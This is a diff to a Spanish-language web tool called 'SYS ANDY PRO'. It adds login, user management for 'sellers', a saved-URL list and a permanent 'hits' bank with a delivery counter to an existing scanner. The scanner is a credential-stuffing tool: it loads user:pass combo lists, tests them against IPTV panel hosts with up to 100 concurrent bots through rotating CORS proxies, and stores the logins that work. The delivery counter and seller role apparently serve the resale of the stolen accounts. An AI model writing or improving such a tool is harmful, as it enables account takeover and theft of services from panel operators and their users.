@@ -25,6 +25,31 @@
             padding: 0;
         }
 
+        /* Pantalla de Login */
+        #auth-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .auth-box {
+            background-color: var(--bg-tarjeta);
+            border: 2px solid var(--borde-neon);
+            border-radius: 12px;
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 20px rgba(168,85,247,0.4);
+        }
+
+        /* Contenedor Principal (Oculto antes del login) */
+        #main-app {
+            display: none;
+        }
+
         /* Barra de navegación superior */
         .navbar {
             background-color: var(--bg-tarjeta);
@@ -66,6 +91,7 @@
             display: flex;
             background-color: #1a1f2c;
             border-bottom: 1px solid #2d3748;
+            overflow-x: auto;
         }
 
         .tab-btn {
@@ -77,6 +103,7 @@
             font-weight: bold;
             cursor: pointer;
             text-align: center;
+            white-space: nowrap;
         }
 
         .tab-btn.active {
@@ -95,7 +122,7 @@
             display: block;
         }
 
-        /* Formularios y controles del escáner */
+        /* Formularios y controles */
         .form-group {
             margin-bottom: 15px;
         }
@@ -107,7 +134,7 @@
             font-size: 0.95rem;
         }
 
-        input[type="text"], input[type="number"], textarea {
+        input[type="text"], input[type="password"], input[type="number"], textarea, select {
             width: 100%;
             padding: 10px;
             background-color: var(--bg-inputs);
@@ -132,7 +159,6 @@
             cursor: pointer;
         }
 
-        /* Botones de acción principales */
         .btn-block {
             width: 100%;
             padding: 12px;
@@ -148,7 +174,37 @@
         .btn-start { background-color: #00bfa5; }
         .btn-stop { background-color: var(--rojo-stop); }
         .btn-save { background-color: #0d47a1; }
+        .btn-action { background-color: var(--azul-boton); margin-top: 5px; }
         .btn-block:disabled { background-color: #424242; color: #757575; cursor: not-allowed; }
+
+        /* Listas de elementos (Bloc de URLs y Banco de Hits) */
+        .item-list {
+            margin-top: 15px;
+        }
+        .item-card {
+            background-color: var(--bg-tarjeta);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 10px;
+        }
+        .item-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 0.85rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            color: white;
+            font-weight: bold;
+        }
+        .btn-edit { background-color: #ffb300; }
+        .btn-del { background-color: var(--rojo-stop); }
+        .btn-copy { background-color: #00bfa5; }
 
         /* Estilos de las cajas de los Trabajos (Jobs) */
         .job-card {
@@ -201,7 +257,7 @@
             text-overflow: ellipsis;
         }
 
-        /* Contenedor Global de Resultados (Hits abajo) */
+        /* Contenedor Global de Resultados */
         .results-title {
             color: #ffeb3b;
             font-size: 1.2rem;
@@ -214,7 +270,7 @@
             background-color: var(--bg-tarjeta);
             padding: 10px;
             border-radius: 8px;
-            max-height: 400px;
+            max-height: 300px;
             overflow-y: auto;
         }
 
@@ -224,7 +280,6 @@
             border-radius: 8px;
             padding: 12px;
             margin-bottom: 10px;
-            box-shadow: 0 0 8px rgba(168,85,247,0.3);
         }
 
         .hit-header {
@@ -242,109 +297,396 @@
             margin: 0;
             font-family: monospace;
         }
+
+        .counter-badge {
+            background-color: #311b92;
+            color: #ffff00;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <div class="navbar">
-        <div class="logo-area">
-            <span class="logo-title">⚙️ SYS ANDY PRO</span>
-            <span class="logo-sub">Admin Activo: Andy Obregón (Owner)</span>
-        </div>
-        <button class="btn-salir" onclick="alert('Saliendo...')">SALIR</button>
-    </div>
-
-    <div class="tabs-container">
-        <button class="tab-btn" onclick="switchTab('bloc')">📝 BLOC</button>
-        <button class="tab-btn" onclick="switchTab('combos')">📦 COMBOS</button>
-        <button class="tab-btn active" onclick="switchTab('scanner')">📡 ESCÁNER LSF</button>
-        <button class="tab-btn" onclick="switchTab('admins')">👥 ADMINS</button>
-    </div>
-
-    <div id="panel-bloc" class="panel">
-        <h3>Bloc de Notas</h3>
-        <textarea rows="10" placeholder="Escribe tus notas aquí..."></textarea>
-    </div>
-
-    <div id="panel-combos" class="panel">
-        <h3>Gestión de Combos</h3>
-        <p style="color:var(--texto-secundario)">Carga tus listas de canales o configuraciones acá.</p>
-    </div>
-
-    <div id="panel-scanner" class="panel active">
-        <div class="form-group">
-            <label>Panel (Host con o sin http/https):</label>
-            <input type="text" id="hostInput" placeholder="ej: lista.com:8080" />
-        </div>
-
-        <div class="form-group">
-            <label>Selecciona tus 3 archivos de Combos (.txt):</label>
-            <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" />
-            <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" />
-            <input type="file" id="comboFile3" accept=".txt" />
-        </div>
-
-        <div class="form-group">
-            <label>...o pega tus combos aquí en texto libre (user:pass):</label>
-            <textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1&#10;Usuario2:Contraseña2"></textarea>
-        </div>
-
-        <div class="form-group">
-            <label>Número de conexiones paralelas (bots):</label>
-            <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
-        </div>
-
-        <div class="checkbox-row">
-            <label class="checkbox-label"><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
-            <label class="checkbox-label"><input type="checkbox" id="soundToggle" checked /> 🔔 Sonido en Hit</label>
-            <label class="checkbox-label"><input type="checkbox" id="autoDownload" checked /> ⬇️ Auto-Descarga</label>
-        </div>
-
-        <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN MULTI-JOB</button>
-        <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
-        <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
-
-        <div class="job-card">
-            <div class="job-header">
-                <span>Trabajo de Análisis 1</span>
-                <span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span>
+    <!-- CONTROL DE ACCESO (PANTALLA LOGIN) -->
+    <div id="auth-screen">
+        <div class="auth-box">
+            <h2 style="text-align:center;color:#ffeb3b;margin-top:0;">⚙️ SYS ANDY PRO</h2>
+            <p style="text-align:center;color:var(--texto-secundario);font-size:0.9rem;">Ingresa tus credenciales de acceso</p>
+            <div class="form-group">
+                <label>Correo Electrónico:</label>
+                <input type="text" id="loginEmail" placeholder="correo@sistema.com">
             </div>
-            <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
-            <div id="progressText" class="job-status">Procesados: 0 / 0</div>
-            <div id="currentCombo" class="job-user">Usuario actual: -</div>
-        </div>
-
-        <div class="job-card">
-            <div class="job-header">
-                <span>Trabajo de Análisis 2</span>
-                <span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span>
+            <div class="form-group">
+                <label>Contraseña:</label>
+                <input type="password" id="loginPass" placeholder="••••••••">
             </div>
-            <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
-            <div id="progressText2" class="job-status">Procesados: 0 / 0</div>
-            <div id="currentCombo2" class="job-user">Usuario actual: -</div>
+            <button class="btn-block btn-start" onclick="procesarLogin()">INGRESAR AL SISTEMA</button>
         </div>
-
-        <div class="job-card">
-            <div class="job-header">
-                <span>Trabajo de Análisis 3</span>
-                <span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span>
-            </div>
-            <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
-            <div id="progressText3" class="job-status">Procesados: 0 / 0</div>
-            <div id="currentCombo3" class="job-user">Usuario actual: -</div>
-        </div>
-
-        <div class="results-title">Resultados del Escaneo Actual:</div>
-        <div id="hitsContainer"></div>
     </div>
 
-    <div id="panel-admins" class="panel">
-        <h3>Panel Administrativo</h3>
-        <p style="color:var(--texto-secundario)">Configuración de vendedores autorizados y accesos.</p>
+    <!-- APLICACIÓN PRINCIPAL -->
+    <div id="main-app">
+        <div class="navbar">
+            <div class="logo-area">
+                <span class="logo-title">⚙️ SYS ANDY PRO</span>
+                <span class="logo-sub" id="userDisplay">Cargando...</span>
+            </div>
+            <button class="btn-salir" onclick="cerrarSesion()">SALIR</button>
+        </div>
+
+        <div class="tabs-container">
+            <button class="tab-btn" onclick="switchTab('bloc')">📝 BLOC URLS</button>
+            <button class="tab-btn" onclick="switchTab('combos')">📦 COMBOS</button>
+            <button class="tab-btn active" onclick="switchTab('scanner')">📡 ESCÁNER LSF</button>
+            <button class="tab-btn" onclick="switchTab('banco-hits')">🗄️ BANCO HITS</button>
+            <button class="tab-btn" id="tabAdminBtn" onclick="switchTab('admins')" style="display:none;">👥 ADMINS</button>
+        </div>
+
+        <!-- SECCIÓN BLOC DE URLS -->
+        <div id="panel-bloc" class="panel">
+            <h3>Bloc de Servidores &amp; URLs</h3>
+            <div class="item-card" style="border:1px dashed var(--borde-neon)">
+                <input type="hidden" id="editUrlId" value="">
+                <div class="form-group">
+                    <label id="lblUrlForm">Agregar nueva URL / Host:</label>
+                    <input type="text" id="inputUrlData" placeholder="ejemplo.com:8080 - Servidor de Pruebas">
+                </div>
+                <button class="btn-block btn-action" id="btnGuardarUrl" onclick="guardarUrlBloc()">GUARDAR URL</button>
+            </div>
+            <div class="item-list" id="listaUrlsContainer"></div>
+        </div>
+
+        <!-- SECCIÓN COMBOS -->
+        <div id="panel-combos" class="panel">
+            <h3>Gestión de Combos</h3>
+            <p style="color:var(--texto-secundario)">Carga tus listas estructuradas acá.</p>
+        </div>
+
+        <!-- SECCIÓN ESCÁNER -->
+        <div id="panel-scanner" class="panel active">
+            <div class="form-group">
+                <label>Panel (Host con o sin http/https):</label>
+                <input type="text" id="hostInput" placeholder="ej: lista.com:8080" />
+            </div>
+
+            <div class="form-group">
+                <label>Selecciona tus 3 archivos de Combos (.txt):</label>
+                <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" />
+                <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" />
+                <input type="file" id="comboFile3" accept=".txt" />
+            </div>
+
+            <div class="form-group">
+                <label>...o pega tus combos aquí en texto libre (user:pass):</label>
+                <textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1&#10;Usuario2:Contraseña2"></textarea>
+            </div>
+
+            <div class="form-group">
+                <label>Número de conexiones paralelas (bots):</label>
+                <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
+            </div>
+
+            <div class="checkbox-row">
+                <label class="checkbox-label"><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
+                <label class="checkbox-label"><input type="checkbox" id="soundToggle" checked /> 🔔 Sonido en Hit</label>
+                <label class="checkbox-label"><input type="checkbox" id="autoDownload" checked /> ⬇️ Auto-Descarga</label>
+            </div>
+
+            <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN MULTI-JOB</button>
+            <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
+            <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
+
+            <!-- TRABAJOS -->
+            <div class="job-card">
+                <div class="job-header"><span>Trabajo de Análisis 1</span><span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span></div>
+                <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
+                <div id="progressText" class="job-status">Procesados: 0 / 0</div>
+                <div id="currentCombo" class="job-user">Usuario actual: -</div>
+            </div>
+
+            <div class="job-card">
+                <div class="job-header"><span>Trabajo de Análisis 2</span><span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span></div>
+                <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
+                <div id="progressText2" class="job-status">Procesados: 0 / 0</div>
+                <div id="currentCombo2" class="job-user">Usuario actual: -</div>
+            </div>
+
+            <div class="job-card">
+                <div class="job-header"><span>Trabajo de Análisis 3</span><span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span></div>
+                <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
+                <div id="progressText3" class="job-status">Procesados: 0 / 0</div>
+                <div id="currentCombo3" class="job-user">Usuario actual: -</div>
+            </div>
+
+            <div class="results-title">Resultados del Escaneo Actual:</div>
+            <div id="hitsContainer"></div>
+        </div>
+
+        <!-- SECCIÓN BANCO PERMANENTE DE HITS -->
+        <div id="panel-banco-hits" class="panel">
+            <h3>🗄️ Historial e Hist Guardadas en la Web</h3>
+            <p style="color:var(--texto-secundario); font-size:0.9rem;">Tus Hits se quedan aquí almacenados permanentemente aunque salgas o entres.</p>
+            <div class="item-list" id="bancoHitsContainer"></div>
+        </div>
+
+        <!-- SECCIÓN ADMINISTACIÓN DE USUARIOS (SOLO OWNER) -->
+        <div id="panel-admins" class="panel">
+            <h3>👥 Control de Usuarios Nuevos</h3>
+            <div class="item-card" style="border:1px dashed #ff4444">
+                <div class="form-group">
+                    <label>Correo del Nuevo Usuario:</label>
+                    <input type="text" id="newAdminEmail" placeholder="vendedor@sistema.com">
+                </div>
+                <div class="form-group">
+                    <label>Contraseña de Acceso:</label>
+                    <input type="password" id="newAdminPass" placeholder="Contraseña">
+                </div>
+                <button class="btn-block btn-start" onclick="crearUsuarioNuevo()">REGISTRAR USUARIO</button>
+            </div>
+            <div class="results-title">Usuarios Registrados:</div>
+            <div id="listaUsuariosSistemas" class="item-list"></div>
+        </div>
     </div>
 
     <script>
-        // Cambiar pestañas
+        // --- BASE DE DATOS LOCAL MULTI-USUARIO ---
+        const OWNER_EMAIL = "andy@admin.com"; // Cuenta Maestro por defecto
+        let currentUser = null;
+
+        function inicializarBaseDatos() {
+            if (!localStorage.getItem('sys_users')) {
+                const cuentasIniciales = {};
+                cuentasIniciales[OWNER_EMAIL] = { pass: "andy1234", role: "Owner" };
+                localStorage.setItem('sys_users', JSON.stringify(cuentasIniciales));
+            }
+            if (!localStorage.getItem('sys_urls')) localStorage.setItem('sys_urls', JSON.stringify({}));
+            if (!localStorage.getItem('sys_saved_hits')) localStorage.setItem('sys_saved_hits', JSON.stringify({}));
+        }
+        inicializarBaseDatos();
+
+        function procesarLogin() {
+            const email = $('loginEmail').value.trim().toLowerCase();
+            const pass = $('loginPass').value;
+            const usuarios = JSON.parse(localStorage.getItem('sys_users'));
+
+            if (usuarios[email] && usuarios[email].pass === pass) {
+                currentUser = { email: email, role: usuarios[email].role };
+                $('auth-screen').style.display = 'none';
+                $('main-app').style.display = 'block';
+                $('userDisplay').textContent = `Admin Activo: ${email} (${usuarios[email].role})`;
+                
+                if (usuarios[email].role === "Owner") {
+                    $('tabAdminBtn').style.display = 'block';
+                    listarUsuariosAdmin();
+                } else {
+                    $('tabAdminBtn').style.display = 'none';
+                }
+                
+                renderizarUrlsBloc();
+                renderizarBancoHits();
+                switchTab('scanner');
+            } else {
+                alert("Credenciales incorrectas o usuario no registrado.");
+            }
+        }
+
+        function cerrarSesion() {
+            currentUser = null;
+            $('loginEmail').value = '';
+            $('loginPass').value = '';
+            $('auth-screen').style.display = 'flex';
+            $('main-app').style.display = 'none';
+        }
+
+        function crearUsuarioNuevo() {
+            if (currentUser.role !== "Owner") return;
+            const email = $('newAdminEmail').value.trim().toLowerCase();
+            const pass = $('newAdminPass').value;
+
+            if(!email || !pass) { alert("Llena todos los campos."); return; }
+
+            const usuarios = JSON.parse(localStorage.getItem('sys_users'));
+            if(usuarios[email]) { alert("Este usuario ya existe."); return; }
+
+            usuarios[email] = { pass: pass, role: "Seller" };
+            localStorage.setItem('sys_users', JSON.stringify(usuarios));
+            alert(`Usuario ${email} registrado con éxito.`);
+            $('newAdminEmail').value = '';
+            $('newAdminPass').value = '';
+            listarUsuariosAdmin();
+        }
+
+        function eliminarUsuario(email) {
+            if(email === OWNER_EMAIL) { alert("No puedes eliminar al Owner."); return; }
+            if(confirm(`¿Seguro que deseas eliminar el acceso a ${email}?`)) {
+                const usuarios = JSON.parse(localStorage.getItem('sys_users'));
+                delete usuarios[email];
+                localStorage.setItem('sys_users', JSON.stringify(usuarios));
+                listarUsuariosAdmin();
+            }
+        }
+
+        function listarUsuariosAdmin() {
+            const usuarios = JSON.parse(localStorage.getItem('sys_users'));
+            const container = $('listaUsuariosSistemas');
+            container.innerHTML = '';
+            for(let key in usuarios) {
+                const div = document.createElement('div');
+                div.className = 'item-card';
+                div.innerHTML = `<div><strong>Correo:</strong> ${key} <span style="color:#ffeb3b">(${usuarios[key].role})</span></div>
+                <div class="item-actions"><button class="btn-small btn-del" onclick="eliminarUsuario('${key}')">Eliminar Acceso</button></div>`;
+                container.appendChild(div);
+            }
+        }
+
+        // --- SECCIÓN GESTIÓN DEL BLOC DE URLS (EDITAR / ELIMINAR / AGREGAR) ---
+        function guardarUrlBloc() {
+            const val = $('inputUrlData').value.trim();
+            const editId = $('editUrlId').value;
+            if(!val) return;
+
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            if (!baseUrls[currentUser.email]) baseUrls[currentUser.email] = [];
+
+            if(editId !== "") {
+                baseUrls[currentUser.email][parseInt(editId)] = val;
+                $('editUrlId').value = "";
+                $('lblUrlForm').textContent = "Agregar nueva URL / Host:";
+            } else {
+                baseUrls[currentUser.email].push(val);
+            }
+
+            localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
+            $('inputUrlData').value = "";
+            renderizarUrlsBloc();
+        }
+
+        function editarUrl(index) {
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            const data = baseUrls[currentUser.email][index];
+            $('inputUrlData').value = data;
+            $('editUrlId').value = index;
+            $('lblUrlForm').textContent = "Modificando la URL seleccionada:";
+            $('inputUrlData').focus();
+        }
+
+        function eliminarUrl(index) {
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            baseUrls[currentUser.email].splice(index, 1);
+            localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
+            renderizarUrlsBloc();
+        }
+
+        function usarUrlEscanner(index) {
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            const data = baseUrls[currentUser.email][index];
+            // Extrae la URL limpia antes del guión si tiene descripción
+            const hostLimpio = data.split(" - ")[0].trim();
+            $('hostInput').value = hostLimpio;
+            switchTab('scanner');
+            updateStartState();
+        }
+
+        function renderizarUrlsBloc() {
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            const container = $('listaUrlsContainer');
+            container.innerHTML = '';
+            
+            const misUrls = baseUrls[currentUser.email] || [];
+            if(misUrls.length === 0) {
+                container.innerHTML = `<p style="color:var(--texto-secundario); text-align:center;">No hay URLs guardadas.</p>`;
+                return;
+            }
+
+            misUrls.forEach((url, index) => {
+                const div = document.createElement('div');
+                div.className = 'item-card';
+                div.innerHTML = `<div>🌐 <code>${url}</code></div>
+                <div class="item-actions">
+                    <button class="btn-small btn-copy" onclick="usarUrlEscanner(${index})">🔌 Escanear</button>
+                    <button class="btn-small btn-edit" onclick="editarUrl(${index})">Editar</button>
+                    <button class="btn-small btn-del" onclick="eliminarUrl(${index})">Eliminar</button>
+                </div>`;
+                container.appendChild(div);
+            });
+        }
+
+        // --- GESTIÓN BANCO PERMANENTE DE HITS CON CONTADOR ---
+        function guardarHitEnBanco(hitTexto, user, pass) {
+            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
+            if(!baseHits[currentUser.email]) baseHits[currentUser.email] = [];
+
+            // Evitar duplicados exactos en el historial del mismo usuario
+            const existe = baseHits[currentUser.email].some(h => h.user === user && h.pass === pass);
+            if (existe) return;
+
+            baseHits[currentUser.email].push({
+                id: Date.now() + Math.random(),
+                user: user,
+                pass: pass,
+                texto: hitTexto,
+                copies: 0
+            });
+            localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
+            renderizarBancoHits();
+        }
+
+        function copiarHitConContador(hitId) {
+            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
+            const list = baseHits[currentUser.email] || [];
+            const item = list.find(h => h.id == hitId);
+            
+            if(item) {
+                item.copies = (item.copies || 0) + 1;
+                localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
+                
+                // Copiar al portapapeles del teléfono
+                navigator.clipboard.writeText(item.texto).then(() => {
+                    renderizarBancoHits();
+                    alert(`¡Hit Copiado! Total de entregas/copias: ${item.copies}`);
+                });
+            }
+        }
+
+        function borrarHitBanco(hitId) {
+            if(confirm("¿Quieres eliminar este Hit permanentemente de tu historial web?")) {
+                const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
+                baseHits[currentUser.email] = (baseHits[currentUser.email] || []).filter(h => h.id != hitId);
+                localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
+                renderizarBancoHits();
+            }
+        }
+
+        function renderizarBancoHits() {
+            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
+            const container = $('bancoHitsContainer');
+            container.innerHTML = '';
+
+            const misHits = baseHits[currentUser.email] || [];
+            if(misHits.length === 0) {
+                container.innerHTML = `<p style="color:var(--texto-secundario); text-align:center;">No tienes Hits almacenados en tu cuenta aún.</p>`;
+                return;
+            }
+
+            misHits.forEach(h => {
+                const div = document.createElement('div');
+                div.className = 'hit-block';
+                div.innerHTML = `<div class="hit-header" style="display:flex; justify-content:between; align-items:center;">
+                    <span>👤 ${h.user}</span>
+                    <span class="counter-badge">Copias/Entregas: ${h.copies || 0}</span>
+                </div>
+                <pre class="hit-content">${h.texto}</pre>
+                <div class="item-actions">
+                    <button class="btn-small btn-copy" onclick="copiarHitConContador(${h.id})">📋 Copiar Hit y Sumar</button>
+                    <button class="btn-small btn-del" onclick="borrarHitBanco(${h.id})">Eliminar de la Web</button>
+                </div>`;
+                container.appendChild(div);
+            });
+        }
+
         function switchTab(tabName) {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -353,7 +695,7 @@
             event.currentTarget.classList.add('active');
         }
 
-        // --- INICIO DE LA LÓGICA DE ESCANEO EFECTIVA (MUNRRA TV ENGINE) ---
+        // --- MOTOR MULTI-PROXIES DE ESCANEO LSF ---
         const CORS_PROXIES = [
             'https://cors.isomorphic-git.org/{url}',
             'https://thingproxy.freeboard.io/fetch/{url}',
@@ -363,7 +705,6 @@
             'https://yacdn.org/proxy/{url}'
         ];
 
-        const $ = id => document.getElementById(id);
         const hostInput = $('hostInput');
         const concurrencyInput = $('concurrencyInput');
         const startBtn = $('startBtn'), stopBtn = $('stopBtn'), saveBtn = $('saveBtn');
@@ -378,18 +719,12 @@
         const progressBarFill3 = $('progressBarFill3'), progressText3 = $('progressText3'), currentCombo3 = $('currentCombo3');
 
         let isRunning = false, stopRequested = false;
-        let serverIP = null, serverGeo = null;
         let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
         const HITS = { 1: [], 2: [], 3: [] };
         let JOB_PROXIES = {};
 
         function randomUA(){
-            const uas = [
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
-            ];
-            return uas[Math.floor(Math.random()*uas.length)];
+            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36";
         }
 
         function limpiarHost(host){ return host.replace(/^https?:\/\//,'').trim(); }
@@ -408,14 +743,9 @@
             startBtn.disabled = !(hasHost && hasAnyCombos);
         }
 
-        // Web Audio para Alertas Inmediatas
         let audioCtx = null;
         function unlockAudio(){
-            try {
-                if(audioCtx) return;
-                const Ctx = window.AudioContext || window.webkitAudioContext;
-                if(Ctx) audioCtx = new Ctx();
-            }catch(_){}
+            try { if(!audioCtx) { const Ctx = window.AudioContext || window.webkitAudioContext; if(Ctx) audioCtx = new Ctx(); } }catch(_){}
         }
 
         function playHitSound(){
@@ -427,7 +757,6 @@
                 g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime+0.01);
                 g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime+0.18);
                 o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime+0.2);
-                if(navigator.vibrate) navigator.vibrate(80);
             }catch(_){}
         }
 
@@ -435,8 +764,7 @@
             const {timeout=6000} = options;
             const controller = new AbortController();
             const id = setTimeout(() => controller.abort(), timeout);
-            try { return await fetch(resource, {...options, signal:controller.signal}); } 
-            finally { clearTimeout(id); }
+            try { return await fetch(resource, {...options, signal:controller.signal}); } finally { clearTimeout(id); }
         }
 
         async function fetchWithCors(url, options = {}, jobId = null){
@@ -451,9 +779,8 @@
             try {
                 const r = await fetchTimeout(url, baseOpts);
                 if(r && r.ok) return r;
-            }catch(e){
-                if(!useCors.checked) throw e;
-            }
+            }catch(e){ if(!useCors.checked) throw e; }
+            
             const pool = [...CORS_PROXIES].filter(tpl => JOB_PROXIES[jobId] !== tpl);
             for(const tpl of pool.sort(()=>Math.random()-0.5)){
                 try {
@@ -462,17 +789,7 @@
                     if(r && r.ok) return r;
                 }catch(_){}
             }
-            throw new Error('Error de conexión total');
-        }
-
-        async function resolveIP(domain){
-            try {
-                const clean = domain.split(':')[0];
-                if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
-                const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
-                const data = await res.json();
-                return data.Answer?.find(a=>a.type===1)?.data || null;
-            }catch{ return null; }
+            throw new Error('Error de conexión');
         }
 
         function uiFor(job){
@@ -489,7 +806,6 @@
                 const [user, pass] = pair;
 
                 if(ui?.user) ui.user.textContent = `Usuario actual: ${user}:${pass}`;
-
                 const protos = ['http://', 'https://'];
                 let data = null, usedProto = 'http://';
 
@@ -523,10 +839,11 @@
             div.innerHTML = `<div class="hit-header">👤 ${hit.user} | 🔑 ${hit.pass}</div><pre class="hit-content">${hit.texto}</pre>`;
             hitsContainer.prepend(div);
 
-            if(ui.hitsCountEl){
-                ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-            }
+            if(ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+            
             playHitSound();
+            // GUARDAR AUTOMÁTICAMENTE EN EL HISTORIAL PERMANENTE DE LA WEB
+            guardarHitEnBanco(hit.texto, hit.user, hit.pass);
         }
 
         async function processarCombosJob(host, combos, conc, jobId){
@@ -536,11 +853,8 @@
 
             async function worker(){
                 while(index < total && !stopRequested){
-                    const i = index++;
-                    if(i >= total) break;
-
-                    const combo = combos[i];
-                    if(!combo) continue;
+                    const i = index++; if(i >= total) break;
+                    const combo = combos[i]; if(!combo) continue;
 
                     let opts = { headers: { "User-Agent": randomUA(), "Accept": "application/json" } };
                     try {
@@ -553,23 +867,19 @@
                         if(ui.fill) ui.fill.style.width = pct + '%';
                         if(ui.text) ui.text.textContent = `Procesados: ${processed} / ${total}`;
                     }
-                    await new Promise(r => setTimeout(r, 50 + Math.random()*50));
+                    await new Promise(r => setTimeout(r, 40));
                 }
             }
             await Promise.all(Array.from({ length: conc }, () => worker()));
-            if(ui.text) ui.text.textContent += stopRequested ? " | Detenido." : " | Finalizado.";
         }
 
-        // Captura de archivos y texto
         function readTxtFile(inputEl, targetArray){
             targetArray.length = 0;
-            const f = inputEl.files?.[0];
-            if(!f) { updateStartState(); return; }
+            const f = inputEl.files?.[0]; if(!f) { updateStartState(); return; }
             const r = new FileReader();
             r.onload = e => {
                 String(e.target.result||'').split(/\r?\n/).forEach(line => {
-                    const pair = extractCombo(line.trim());
-                    if(pair) targetArray.push(`${pair[0]}:${pair[1]}`);
+                    const pair = extractCombo(line.trim()); if(pair) targetArray.push(`${pair[0]}:${pair[1]}`);
                 });
                 updateStartState();
             };
@@ -579,38 +889,26 @@
         comboFile1.addEventListener('change', () => readTxtFile(comboFile1, combos1));
         comboFile2.addEventListener('change', () => readTxtFile(comboFile2, combos2));
         comboFile3.addEventListener('change', () => readTxtFile(comboFile3, combos3));
-
         comboText.addEventListener('input', () => {
             combosTxt.length = 0;
             comboText.value.split(/\r?\n/).forEach(line => {
-                const pair = extractCombo(line);
-                if(pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
+                const pair = extractCombo(line); if(pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
             });
             updateStartState();
         });
-
         hostInput.addEventListener('input', updateStartState);
 
-        // Control de los Botones
         startBtn.addEventListener('click', async () => {
             if(isRunning) return;
             unlockAudio();
-
             isRunning = true; stopRequested = false;
             startBtn.disabled = true; stopBtn.disabled = false; saveBtn.disabled = true;
             hitsContainer.textContent = '';
 
-            [hitsCount1, hitsCount2, hitsCount3].forEach(el => el.innerHTML = `Hits: <span class="yellow-hit">0</span>`);
-            [progressBarFill, progressBarFill2, progressBarFill3].forEach(el => el.style.width = '0%');
-
             const host = limpiarHost(hostInput.value);
             const baseConc = parseInt(concurrencyInput.value) || 80;
 
-            if(combosTxt.length){
-                combos1 = combos1.concat(combosTxt);
-                combosTxt = [];
-                comboText.value = '';
-            }
+            if(combosTxt.length){ combos1 = combos1.concat(combosTxt); combosTxt = []; comboText.value = ''; }
 
             const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
             if(combos1.length) JOB_PROXIES[1] = shuffled[0];
@@ -624,8 +922,6 @@
 
             Promise.allSettled(jobs).then(() => {
